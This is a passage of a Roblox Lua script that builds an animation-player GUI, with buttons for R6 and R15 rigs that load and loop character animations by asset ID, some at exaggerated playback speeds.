		CheckR.BackgroundColor3 = Color3.new(1, 1, 1)
		CheckR.BackgroundTransparency = 1
		CheckR.Size = UDim2.new(0, 171, 0, 32)
		CheckR.Font = Enum.Font.SourceSansBold
		CheckR.FontSize = Enum.FontSize.Size14
		CheckR.Text = "Text"
		CheckR.TextScaled = true
		CheckR.TextSize = 14
		CheckR.TextWrapped = true
		ScrollingFrameR15.Name = "ScrollingFrameR15"
		ScrollingFrameR15.Parent = MainFrame
		ScrollingFrameR15.BackgroundColor3 = Color3.new(1, 0.564706, 0.564706)
		ScrollingFrameR15.Position = UDim2.new(0, 0, 0, 32)
		ScrollingFrameR15.Size = UDim2.new(0, 460, 0, 215)
		ScrollingFrameR15.Visible = false
		ScrollingFrameR15.ScrollBarThickness = 13
		CrazySlash.Name = "CrazySlash"
		CrazySlash.Parent = ScrollingFrameR15
		CrazySlash.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
		CrazySlash.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		CrazySlash.Position = UDim2.new(0, 17, 0, 16)
		CrazySlash.Size = UDim2.new(0, 119, 0, 34)
		CrazySlash.Font = Enum.Font.Highway
		CrazySlash.FontSize = Enum.FontSize.Size24
		CrazySlash.Text = "CrazySlash"
		CrazySlash.TextSize = 20
		CrazySlash.TextWrapped = true
		Open.Name = "Open"
		Open.Parent = ScrollingFrameR15
		Open.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
		Open.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		Open.Position = UDim2.new(0, 168, 0, 16)
		Open.Size = UDim2.new(0, 119, 0, 34)
		Open.Font = Enum.Font.Highway
		Open.FontSize = Enum.FontSize.Size24
		Open.Text = "Open"
		Open.TextSize = 20
		Open.TextWrapped = true
		R15Spinner.Name = "R15Spinner"
		R15Spinner.Parent = ScrollingFrameR15
		R15Spinner.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
		R15Spinner.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		R15Spinner.Position = UDim2.new(0, 17, 0, 60)
		R15Spinner.Size = UDim2.new(0, 119, 0, 34)
		R15Spinner.Font = Enum.Font.Highway
		R15Spinner.FontSize = Enum.FontSize.Size24
		R15Spinner.Text = "Spinner"
		R15Spinner.TextSize = 20
		R15Spinner.TextWrapped = true
		ArmsOut.Name = "ArmsOut"
		ArmsOut.Parent = ScrollingFrameR15
		ArmsOut.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
		ArmsOut.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		ArmsOut.Position = UDim2.new(0, 319, 0, 16)
		ArmsOut.Size = UDim2.new(0, 119, 0, 34)
		ArmsOut.Font = Enum.Font.Highway
		ArmsOut.FontSize = Enum.FontSize.Size24
		ArmsOut.Text = "ArmsOut"
		ArmsOut.TextSize = 20
		ArmsOut.TextWrapped = true
		FloatSlash.Name = "FloatSlash"
		FloatSlash.Parent = ScrollingFrameR15
		FloatSlash.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
		FloatSlash.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		FloatSlash.Position = UDim2.new(0, 168, 0, 148)
		FloatSlash.Size = UDim2.new(0, 119, 0, 34)
		FloatSlash.Font = Enum.Font.Highway
		FloatSlash.FontSize = Enum.FontSize.Size24
		FloatSlash.Text = "FloatSlash"
		FloatSlash.TextSize = 20
		FloatSlash.TextWrapped = true
		WeirdZombie.Name = "WeirdZombie"
		WeirdZombie.Parent = ScrollingFrameR15
		WeirdZombie.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
		WeirdZombie.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		WeirdZombie.Position = UDim2.new(0, 17, 0, 148)
		WeirdZombie.Size = UDim2.new(0, 119, 0, 34)
		WeirdZombie.Font = Enum.Font.Highway
		WeirdZombie.FontSize = Enum.FontSize.Size24
		WeirdZombie.Text = "WeirdZombie"
		WeirdZombie.TextSize = 20
		WeirdZombie.TextWrapped = true
		DownSlash.Name = "DownSlash"
		DownSlash.Parent = ScrollingFrameR15
		DownSlash.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
		DownSlash.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		DownSlash.Position = UDim2.new(0, 319, 0, 148)
		DownSlash.Size = UDim2.new(0, 119, 0, 34)
		DownSlash.Font = Enum.Font.Highway
		DownSlash.FontSize = Enum.FontSize.Size24
		DownSlash.Text = "DownSlash"
		DownSlash.TextSize = 20
		DownSlash.TextWrapped = true
		Pull.Name = "Pull"
		Pull.Parent = ScrollingFrameR15
		Pull.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
		Pull.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		Pull.Position = UDim2.new(0, 17, 0, 104)
		Pull.Size = UDim2.new(0, 119, 0, 34)
		Pull.Font = Enum.Font.Highway
		Pull.FontSize = Enum.FontSize.Size24
		Pull.Text = "Pull"
		Pull.TextSize = 20
		Pull.TextWrapped = true
		CircleArm.Name = "CircleArm"
		CircleArm.Parent = ScrollingFrameR15
		CircleArm.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
		CircleArm.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		CircleArm.Position = UDim2.new(0, 168, 0, 104)
		CircleArm.Size = UDim2.new(0, 119, 0, 34)
		CircleArm.Font = Enum.Font.Highway
		CircleArm.FontSize = Enum.FontSize.Size24
		CircleArm.Text = "CircleArm"
		CircleArm.TextSize = 20
		CircleArm.TextWrapped = true
		Bend.Name = "Bend"
		Bend.Parent = ScrollingFrameR15
		Bend.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
		Bend.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		Bend.Position = UDim2.new(0, 319, 0, 104)
		Bend.Size = UDim2.new(0, 119, 0, 34)
		Bend.Font = Enum.Font.Highway
		Bend.FontSize = Enum.FontSize.Size24
		Bend.Text = "Bend"
		Bend.TextSize = 20
		Bend.TextWrapped = true
		RotateSlash.Name = "RotateSlash"
		RotateSlash.Parent = ScrollingFrameR15
		RotateSlash.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
		RotateSlash.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		RotateSlash.Position = UDim2.new(0, 319, 0, 60)
		RotateSlash.Size = UDim2.new(0, 119, 0, 34)
		RotateSlash.Font = Enum.Font.Highway
		RotateSlash.FontSize = Enum.FontSize.Size24
		RotateSlash.Text = "RotateSlash"
		RotateSlash.TextSize = 20
		RotateSlash.TextWrapped = true
		FlingArms.Name = "FlingArms"
		FlingArms.Parent = ScrollingFrameR15
		FlingArms.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
		FlingArms.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
		FlingArms.Position = UDim2.new(0, 168, 0, 60)
		FlingArms.Size = UDim2.new(0, 119, 0, 34)
		FlingArms.Font = Enum.Font.Highway
		FlingArms.FontSize = Enum.FontSize.Size24
		FlingArms.Text = "FlingArms"
		FlingArms.TextSize = 20
		FlingArms.TextWrapped = true

-- Buttons
		col = Color3.new(0.886275, 0.776471, 0.368627)
		loc = Color3.new(1, 0.906471, 0.568627)
		rcol = Color3.new(0.682353, 0.701961, 0.792157)
		rloc = Color3.new(0.882353, 0.901961, 0.992157)
		CloseGUI.MouseButton1Click:connect(function()
			MainFrame.Visible = false
			SideFrame.Visible = true
			SideFrame.Position = MainFrame.Position
		end)
		OpenGUI.MouseButton1Click:connect(function()
			MainFrame.Visible = true
			SideFrame.Visible = false
			MainFrame.Position = SideFrame.Position
		end)
		if (game:GetService"Players".LocalPlayer.Character:WaitForChild("Humanoid").RigType == Enum.HumanoidRigType.R15) then
			ScrollingFrame.Visible = false
			ScrollingFrameR15.Visible = true
			CheckR.Text = "Showing R15 Animations"
		else
			ScrollingFrame.Visible = true
			ScrollingFrameR15.Visible = false
			CheckR.Text = "Showing R6 Animations"
		end
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://35154961"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local HeadThrowACTIVE = false
		HeadThrow.MouseButton1Click:connect(function()
			HeadThrowACTIVE = not HeadThrowACTIVE
			if HeadThrowACTIVE then
				HeadThrow.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if HeadThrowACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				HeadThrow.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://121572214"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local FloatingHeadACTIVE = false
		FloatingHead.MouseButton1Click:connect(function()
			FloatingHeadACTIVE = not FloatingHeadACTIVE
			if FloatingHeadACTIVE then
				track:Play(.1, 1, 1)
				FloatingHead.BackgroundColor3 = loc
			else
				track:Stop()
				FloatingHead.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://182724289"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local CrouchACTIVE = false
		Crouch.MouseButton1Click:connect(function()
			CrouchACTIVE = not CrouchACTIVE
			if CrouchACTIVE then
				track:Play(.1, 1, 1)
				Crouch.BackgroundColor3 = loc
			else
				track:Stop()
				Crouch.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://282574440"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local FloorCrawlACTIVE = false
		FloorCrawl.MouseButton1Click:connect(function()
			FloorCrawlACTIVE = not FloorCrawlACTIVE
			if FloorCrawlACTIVE then
				track:Play(.1, 1, 1)
				FloorCrawl.BackgroundColor3 = loc
			else
				track:Stop()
				FloorCrawl.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://204328711"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local DinoWalkACTIVE = false
		DinoWalk.MouseButton1Click:connect(function()
			DinoWalkACTIVE = not DinoWalkACTIVE
			if DinoWalkACTIVE then
				track:Play(.1, 1, 1)
				DinoWalk.BackgroundColor3 = loc
			else
				track:Stop()
				DinoWalk.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://429681631"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local JumpingJacksACTIVE = false
		JumpingJacks.MouseButton1Click:connect(function()
			JumpingJacksACTIVE = not JumpingJacksACTIVE
			if JumpingJacksACTIVE then
				track:Play(.1, 1, 1)
				JumpingJacks.BackgroundColor3 = loc
			else
				track:Stop()
				JumpingJacks.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://35154961"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local LoopHeadACTIVE = false
		LoopHead.MouseButton1Click:connect(function()
			LoopHeadACTIVE = not LoopHeadACTIVE
			if LoopHeadACTIVE then
				LoopHead.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if LoopHeadACTIVE then
							track:Play(.5, 1, 1e6)
						end
					end
				end
			else
				track:Stop()
				LoopHead.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://184574340"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local HeroJumpACTIVE = false
		HeroJump.MouseButton1Click:connect(function()
			HeroJumpACTIVE = not HeroJumpACTIVE
			if HeroJumpACTIVE then
				HeroJump.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if HeroJumpACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				HeroJump.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://181526230"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local FaintACTIVE = false
		Faint.MouseButton1Click:connect(function()
			FaintACTIVE = not FaintACTIVE
			if FaintACTIVE then
				track:Play(.1, 1, 1)
				Faint.BackgroundColor3 = loc
			else
				track:Stop()
				Faint.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://181525546"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local FloorFaintACTIVE = false
		FloorFaint.MouseButton1Click:connect(function()
			FloorFaintACTIVE = not FloorFaintACTIVE
			if FloorFaintACTIVE then
				FloorFaint.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if FloorFaintACTIVE then
							track:Play(.1, 1, 2)
						end
					end
				end
			else
				track:Stop()
				FloorFaint.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://181525546"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local SuperFaintACTIVE = false
		SuperFaint.MouseButton1Click:connect(function()
			SuperFaintACTIVE = not SuperFaintACTIVE
			if SuperFaintACTIVE then
				SuperFaint.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if SuperFaintACTIVE then
							track:Play(.1, 0.5, 40)
						end
					end
				end
			else
				track:Stop()
				SuperFaint.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://313762630"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local LevitateACTIVE = false
		Levitate.MouseButton1Click:connect(function()
			LevitateACTIVE = not LevitateACTIVE
			if LevitateACTIVE then
				track:Play(.1, 1, 1)
				Levitate.BackgroundColor3 = loc
			else
				track:Stop()
				Levitate.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://183412246"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local DabACTIVE = false
		Dab.MouseButton1Click:connect(function()
			DabACTIVE = not DabACTIVE
			if DabACTIVE then
				Dab.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if DabACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				Dab.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://188632011"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local SpinACTIVE = false
		Spinner.MouseButton1Click:connect(function()
			SpinACTIVE = not SpinACTIVE
			if SpinACTIVE then
				Spinner.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if SpinACTIVE then
							track:Play(.1, 1, 2)
						end
					end
				end
			else
				track:Stop()
				Spinner.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://179224234"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local FloatSitACTIVE = false
		FloatSit.MouseButton1Click:connect(function()
			FloatSitACTIVE = not FloatSitACTIVE
			if FloatSitACTIVE then
				track:Play(.1, 1, 1)
				FloatSit.BackgroundColor3 = loc
			else
				track:Stop()
				FloatSit.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://429703734"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local MovingDanceACTIVE = false
		MovingDance.MouseButton1Click:connect(function()
			MovingDanceACTIVE = not MovingDanceACTIVE
			if MovingDanceACTIVE then
				MovingDance.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if MovingDanceACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				MovingDance.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://215384594"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local WeirdMoveACTIVE = false
		WeirdMove.MouseButton1Click:connect(function()
			WeirdMoveACTIVE = not WeirdMoveACTIVE
			if WeirdMoveACTIVE then
				track:Play(.1, 1, 1)
				WeirdMove.BackgroundColor3 = loc
			else
				track:Stop()
				WeirdMove.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://215384594"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local CloneIllusionACTIVE = false
		CloneIllusion.MouseButton1Click:connect(function()
			CloneIllusionACTIVE = not CloneIllusionACTIVE
			if CloneIllusionACTIVE then
				track:Play(.5, 1, 1e7)
				CloneIllusion.BackgroundColor3 = loc
			else
				track:Stop()
				CloneIllusion.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://313762630"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local GlitchLevitateACTIVE = false
		GlitchLevitate.MouseButton1Click:connect(function()
			GlitchLevitateACTIVE = not GlitchLevitateACTIVE
			if GlitchLevitateACTIVE then
				track:Play(.5, 1, 1e7)
				GlitchLevitate.BackgroundColor3 = loc
			else
				track:Stop()
				GlitchLevitate.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://429730430"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local SpinDanceACTIVE = false
		SpinDance.MouseButton1Click:connect(function()
			SpinDanceACTIVE = not SpinDanceACTIVE
			if SpinDanceACTIVE then
				SpinDance.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if SpinDanceACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				SpinDance.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://45834924"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local MoonDanceACTIVE = false
		MoonDance.MouseButton1Click:connect(function()
			MoonDanceACTIVE = not MoonDanceACTIVE
			if MoonDanceACTIVE then
				MoonDance.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if MoonDanceACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				MoonDance.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://204062532"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local FullPunchACTIVE = false
		FullPunch.MouseButton1Click:connect(function()
			FullPunchACTIVE = not FullPunchACTIVE
			if FullPunchACTIVE then
				FullPunch.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if FullPunchACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				FullPunch.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://186934910"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local SpinDance2ACTIVE = false
		SpinDance2.MouseButton1Click:connect(function()
			SpinDance2ACTIVE = not SpinDance2ACTIVE
			if SpinDance2ACTIVE then
				SpinDance2.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if SpinDance2ACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				SpinDance2.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://204292303"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local BowDownACTIVE = false
		BowDown.MouseButton1Click:connect(function()
			BowDownACTIVE = not BowDownACTIVE
			if BowDownACTIVE then
				BowDown.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if BowDownACTIVE then
							track:Play(.1, 1, 3)
						end
					end
				end
			else
				track:Stop()
				BowDown.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://204295235"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local SwordSlamACTIVE = false
		SwordSlam.MouseButton1Click:connect(function()
			SwordSlamACTIVE = not SwordSlamACTIVE
			if SwordSlamACTIVE then
				SwordSlam.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if SwordSlamACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				SwordSlam.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://204295235"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local LoopSlamACTIVE = false
		LoopSlam.MouseButton1Click:connect(function()
			LoopSlamACTIVE = not LoopSlamACTIVE
			if LoopSlamACTIVE then
				LoopSlam.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if LoopSlamACTIVE then
							track:Play(.1, 1, 1e4)
						end
					end
				end
			else
				track:Stop()
				LoopSlam.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://184574340"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local MegaInsaneACTIVE = false
		MegaInsane.MouseButton1Click:connect(function()
			MegaInsaneACTIVE = not MegaInsaneACTIVE
			if MegaInsaneACTIVE then
				MegaInsane.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if MegaInsaneACTIVE then
							track:Play(.1, 0.5, 40)
						end
					end
				end
			else
				track:Stop()
				MegaInsane.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://126753849"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local SuperPunchACTIVE = false
		SuperPunch.MouseButton1Click:connect(function()
			SuperPunchACTIVE = not SuperPunchACTIVE
			if SuperPunchACTIVE then
				SuperPunch.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if SuperPunchACTIVE then
							track:Play(.1, 1, 3)
						end
					end
				end
			else
				track:Stop()
				SuperPunch.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://218504594"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local FullSwingACTIVE = false
		FullSwing.MouseButton1Click:connect(function()
			FullSwingACTIVE = not FullSwingACTIVE
			if FullSwingACTIVE then
				FullSwing.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if FullSwingACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				FullSwing.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://259438880"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local ArmTurbineACTIVE = false
		ArmTurbine.MouseButton1Click:connect(function()
			ArmTurbineACTIVE = not ArmTurbineACTIVE
			if ArmTurbineACTIVE then
				track:Play(.1, 1, 1e3)
				ArmTurbine.BackgroundColor3 = loc
			else
				track:Stop()
				ArmTurbine.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://136801964"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local BarrelRollACTIVE = false
		BarrelRoll.MouseButton1Click:connect(function()
			BarrelRollACTIVE = not BarrelRollACTIVE
			if BarrelRollACTIVE then
				BarrelRoll.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if BarrelRollACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				BarrelRoll.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://180612465"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local ScaredACTIVE = false
		Scared.MouseButton1Click:connect(function()
			ScaredACTIVE = not ScaredACTIVE
			if ScaredACTIVE then
				Scared.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if ScaredACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				Scared.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://33796059"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local InsaneACTIVE = false
		Insane.MouseButton1Click:connect(function()
			InsaneACTIVE = not InsaneACTIVE
			if InsaneACTIVE then
				track:Play(.1, 1, 1e8)
				Insane.BackgroundColor3 = loc
			else
				track:Stop()
				Insane.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://33169583"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local ArmDetachACTIVE = false
		ArmDetach.MouseButton1Click:connect(function()
			ArmDetachACTIVE = not ArmDetachACTIVE
			if ArmDetachACTIVE then
				ArmDetach.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if ArmDetachACTIVE then
							track:Play(.1, 1, 1e6)
						end
					end
				end
			else
				track:Stop()
				ArmDetach.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://35978879"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local SwordSliceACTIVE = false
		SwordSlice.MouseButton1Click:connect(function()
			SwordSliceACTIVE = not SwordSliceACTIVE
			if SwordSliceACTIVE then
				track:Play(.1, 1, 1)
				SwordSlice.BackgroundColor3 = loc
			else
				track:Stop()
				SwordSlice.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://27432691"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local InsaneArmsACTIVE = false
		InsaneArms.MouseButton1Click:connect(function()
			InsaneArmsACTIVE = not InsaneArmsACTIVE
			if InsaneArmsACTIVE then
				InsaneArms.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if InsaneArmsACTIVE then
							track:Play(.1, 1, 1e4)
						end
					end
				end
			else
				track:Stop()
				InsaneArms.BackgroundColor3 = col
			end
		end)
-- R15
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://674871189"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local CrazySlashACTIVE = false
		CrazySlash.MouseButton1Click:connect(function()
			CrazySlashACTIVE = not CrazySlashACTIVE
			if CrazySlashACTIVE then
				CrazySlash.BackgroundColor3 = rloc
				while wait() do
					if track.IsPlaying == false then
						if CrazySlashACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				CrazySlash.BackgroundColor3 = rcol
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://582855105"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local OpenACTIVE = false
		Open.MouseButton1Click:connect(function()
			OpenACTIVE = not OpenACTIVE
			if OpenACTIVE then
				Open.BackgroundColor3 = rloc
				while wait() do
					if track.IsPlaying == false then
						if OpenACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				Open.BackgroundColor3 = rcol
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://754658275"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local R15SpinnerACTIVE = false
		R15Spinner.MouseButton1Click:connect(function()
			R15SpinnerACTIVE = not R15SpinnerACTIVE
			if R15SpinnerACTIVE then
				R15Spinner.BackgroundColor3 = rloc
				while wait() do
					if track.IsPlaying == false then
						if R15SpinnerACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				R15Spinner.BackgroundColor3 = rcol
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://582384156"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local ArmsOutACTIVE = false
		ArmsOut.MouseButton1Click:connect(function()
			ArmsOutACTIVE = not ArmsOutACTIVE
			if ArmsOutACTIVE then
				ArmsOut.BackgroundColor3 = rloc
				while wait() do
					if track.IsPlaying == false then
						if ArmsOutACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				ArmsOut.BackgroundColor3 = rcol
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://717879555"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local FloatSlashACTIVE = false
		FloatSlash.MouseButton1Click:connect(function()
			FloatSlashACTIVE = not FloatSlashACTIVE
			if FloatSlashACTIVE then
				FloatSlash.BackgroundColor3 = rloc
				while wait() do
					if track.IsPlaying == false then
						if FloatSlashACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				FloatSlash.BackgroundColor3 = rcol
